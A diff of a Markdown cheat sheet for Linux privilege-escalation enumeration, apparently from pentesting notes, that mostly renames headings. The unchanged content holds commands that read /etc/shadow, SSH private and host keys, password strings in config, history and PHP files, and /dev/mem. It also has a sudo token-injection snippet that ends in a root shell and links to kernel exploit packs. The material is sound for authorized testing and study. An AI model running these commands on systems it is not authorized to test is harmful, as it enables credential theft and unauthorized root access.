@@ -6,23 +6,17 @@ description: >-
 
 # Enumeration
 
-### system information <a id="first"></a>
+## system information
 
-#### What's the distribution type? What version?
+###  distribution type and version
 
 #### `cat /etc/issue  cat /etc/*-release  cat /etc/lsb-release # Debian based  cat /etc/redhat-release # Redhat based`
 
-#### env info, might contain interesting info about system, API keys or command shortcuts:
-
-#### `(env || set) 2>/dev/null`
-
-#### What's the kernel version? Is it 64-bit?
+### kernel version
 
 #### `cat /proc/version  uname -a  uname -mrs  cat /proc/$$/status | grep "[UG]id"  rpm -q kernel  dmesg | grep Linux  ls /boot | grep vmlinuz-`
 
-#### 
-
-#### places to find kernel exploits:
+### places to find kernel exploits:
 
 [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)  
  [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
@@ -39,7 +33,7 @@ description: >-
  [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)  
  [http://www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)
 
-## sudo\_inject
+### sudo\_inject
 
 #### this has requirements, doesn't work all the time:\(
 
@@ -47,39 +41,39 @@ description: >-
 
 #### `$ sudo whatever  [sudo] password for user:  # Press+c since you don't have the password.  # This creates an invalid sudo tokens.  $ sh exploit.sh  .... wait 1 seconds  $ sudo -i # no password required :)  # id  uid=0(root) gid=0(root) groups=0(root)`
 
-\`\`
-
-#### What can be learnt from the environmental variables?
+###  environmental variables
 
 #### `cat /etc/profile  cat /home/*/.bashrc | grep alias | grep -v "#"  cat /root/.bashrc | grep alias | grep -v "#"  cat ~/.bash_profile  cat ~/.bashrc  cat ~/.bash_logout  env  set`
 
-#### in-memory password
+### in-memory password
 
 #### `strings /dev/mem -n10 | grep -i PASS`
 
-#### driver info
+### driver info
 
 #### `lsmod  /sbin/modinfo [lib]  ls /dev 2>/dev/null | grep -i "sd"  cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null   #Check if credentials in fstab  grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`
 
-#### available shells
+### available shells
 
 #### `cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null`
 
-#### available programming languages
+### available programming languages
 
 #### ``progr_dev=( "which perl" "which gcc" "which g++" "which python" "which php" "which cc" "which go" "which node") ;for programming_lang in "${progr_dev[@]}"; do pss=`$programming_lang |cut -d"/" -f4` ;if [ "$pss" ]; then echo -e "$pss" ;fi done``
 
-####   check emails
+###   check emails
 
-#### `mail && ls -alh /var/mail/`    Is there a printer?
+#### `mail && ls -alh /var/mail/`
+
+###   printers
 
 ####  `lpstat -a`
 
-####  What other users & hosts are communicating with the system? 
+###  network connections and known hosts
 
 ####  `lsof -i  lsof -i :80  grep 80 /etc/services  netstat -antup  netstat -antpx  netstat -tulpn  chkconfig --list  chkconfig --list | grep 3:on  last  w  cat /etc/sudoers`
 
-####  How can files be uploaded? 
+###  available file transfer methods
 
 ####  `find / -name wget  find / -name nc*  find / -name netcat*  find / -name tftp*  find / -name ftp`
 
@@ -87,27 +81,27 @@ description: >-
 
 ## users and accounts
 
-####   check for sudo access
+###   check for sudo access
 
 ####  `sudo -l |grep vim  sudo -l |grep nmap  sudo -l |grep vi  sudo -l`
 
-####  users UID and GID
+###  users UID and GID
 
 #### `for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done`
 
-#### users with UID 0 \(root\) accounts
+### users with UID 0 \(root\) accounts
 
 #### `cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":"|awk '{print $1}'`
 
-####  users readable history file
+###  users readable history file
 
 ####  `find /home/* -name *.*history* -print 2> /dev/null`
 
-####  check history
+###  check history
 
 ####  `cat ~/.bash_history  cat ~/.nano_history  cat ~/.atftp_history  cat ~/.mysql_history  cat ~/.php_history`
 
-####  user info
+###  user info
 
 ####  `cat ~/.bashrc  cat ~/.profile  cat /var/mail/root  cat /var/spool/mail/root`
 
@@ -133,29 +127,31 @@ description: >-
 
 ## network
 
-####   What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
+###   network/firewall/DNS configurations
 
 ####  `cat /etc/resolv.conf  cat /etc/sysconfig/network  cat /etc/networks  iptables -L  hostname  dnsdomainname`
 
-####  network status
+###  network status
 
 ####  `ss -anp  netstat -ano  /sbin/ifconfig -a  cat /etc/network/interfaces  cat /etc/sysconfig/network  arp -e  route  /sbin/route -nee`
 
-####  Is packet sniffing possible? What can be seen? Listen to live traffic
+###  try packet sniffing
 
 ####  `tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21`
 
-####  firewall rules
+###  firewall rules
 
 ####  `/etc/iptables  iptables -L  grep -Hs iptables /etc/*`
 
-####  hosts and DNS `cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'`
+###  hosts and DNS 
 
-####   ssh root login status
+#### `cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'`
+
+###   ssh root login status
 
 ####  `cat /etc/ssh/sshd_config | grep PermitRootLogin | grep -v "#"`
 
-####   ssh info
+###   ssh info
 
 #### `cat ~/.ssh/identity.pub ~/.ssh/authorized_keys ~/.ssh/identity ~/.ssh/id_rsa.pub ~/.ssh/id_rsa ~/.ssh/id_dsa.pub ~/.ssh/id_dsa /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key 2>/dev/null`
 
@@ -163,15 +159,15 @@ description: >-
 
 ## tasks and processes
 
-####   print process binaries/paths and permissions
+###   print process binaries/paths and permissions
 
 #### `ps aux | awk '{print $11}' |xargs -r ls -la 2>/dev/null |awk '!x[$0]++'`
 
-#### find new running processes
+### find new running processes
 
 #### `#!/bin/bash  #Loop by line  IFS=$'\n'  old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)  while true; do  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]  sleep 1  old_process=$new_process`
 
-####  What services are running? Which service has which user privilege?
+###  check services and privileges 
 
 ####  `ps aux  ps -ef  ps aux | grep "^root"  top  cat /etc/services`
 
@@ -183,7 +179,7 @@ description: >-
 
 ####  `ls -alh /usr/bin/  ls -alh /sbin/  dpkg -l | grep  rpm -qa | grep  ls -alh /var/cache/apt/archives  ls -alh /var/cache/yum/`
 
-####  scheduled Tasks 
+###  scheduled Tasks 
 
 ####  `ls -lah /etc/cron*  cat /etc/crontab  crontab -l  ls -alh /var/spool/cron  ls -al /etc/ | grep cron  ls -al /etc/cron*  cat /etc/cron*  cat /etc/at.allow  cat /etc/at.deny  cat /etc/cron.allow  cat /etc/cron.deny  cat /etc/crontab  cat /etc/anacrontab  cat /var/spool/cron/crontabs/root`
 
@@ -216,15 +212,15 @@ description: >-
 
 ## programs and software
 
-####   enumerate useful binaries
+###   enumerate useful binaries
 
 #### `which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null` 
 
-####  enumerate compilers
+###  enumerate compilers
 
 ####  `(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")`
 
-####   installed software and packages 
+###   installed software and packages 
 
 ####  `dpkg -l  rpm -q`
 
@@ -260,59 +256,59 @@ Then, create a **executable** with the **same name as the relative path binary**
 
 ## files and directories
 
-####   find password in php files
+###   find password in php files
 
 #### `find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null`
 
-####  find writable files
+###  find writable files
 
 ####  `find / -writable -type d 2>/dev/null`
 
-####  find SUID files
+###  find SUID files
 
 ####  `find / -perm -u=s -type f 2>/dev/null  find / -perm -4000 -type f 2>/dev/null`
 
-####  Find SUID files owned by root
+###  Find SUID files owned by root
 
 ####  `find / -uid 0 –perm -4000 –type f 2>/dev/null`
 
-####  Find GUID files
+###  Find GUID files
 
 ####  `find / -perm -2000 -type -f 2>/dev/null`
 
-####  Find world-writable files
+###  Find world-writable files
 
 ####  `find -perm -2 -type f 2>/dev/null`
 
-####  List all conf files in /etc/
+###  List all conf files in /etc/
 
 ####  `ls -al /etc/*.conf  grep pass* /etc/*.conf >>> containing passwords`
 
-####  Find conf files that contain the string “pass\*”
+###  Find conf files that contain the string “pass\*”
 
 #### `grep pass* /etc/*.conf  grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null  find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
 
-####  list of open files
+###  list of open files
 
 ####  `lsof -n`
 
-####  last edited files
+###  last edited files
 
 ####  `find / -mmin -10 2>/dev/null | grep -Ev "^/proc"`
 
-####  Readable/Writable Files and Directories
+###  Readable/Writable Files and Directories
 
 ####  `find / -writable -type d 2>/dev/null`
 
-####  mount volumes
+###  mount volumes
 
 ####  `cat /etc/fstab  mount  /bin/lsblk`
 
-####  search for SUID set
+###  search for SUID set
 
 ####  `find / -perm -u=s -type f 2>/dev/null`
 
-####  plain text usernames and/or passwords
+###  plain text usernames and/or passwords
 
 #### `grep -i user [filename]  grep -i pass [filename]  grep -C 5 "password" [filename]  find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla`
 
@@ -320,7 +316,7 @@ Then, create a **executable** with the **same name as the relative path binary**
 
 ####  `cat /etc/passwd  cat /etc/group  cat /etc/shadow  ls -alh /var/mail/`
 
-####  ssh key info 
+###  ssh key info 
 
 ####  `cat ~/.ssh/authorized_keys  cat ~/.ssh/identity.pub  cat ~/.ssh/identity  cat ~/.ssh/id_rsa.pub  cat ~/.ssh/id_rsa  cat ~/.ssh/id_dsa.pub  cat ~/.ssh/id_dsa  cat /etc/ssh/ssh_config  cat /etc/ssh/sshd_config  cat /etc/ssh/ssh_host_dsa_key.pub  cat /etc/ssh/ssh_host_dsa_key  cat /etc/ssh/ssh_host_rsa_key.pub  cat /etc/ssh/ssh_host_rsa_key  cat /etc/ssh/ssh_host_key.pub  cat /etc/ssh/ssh_host_key`
 
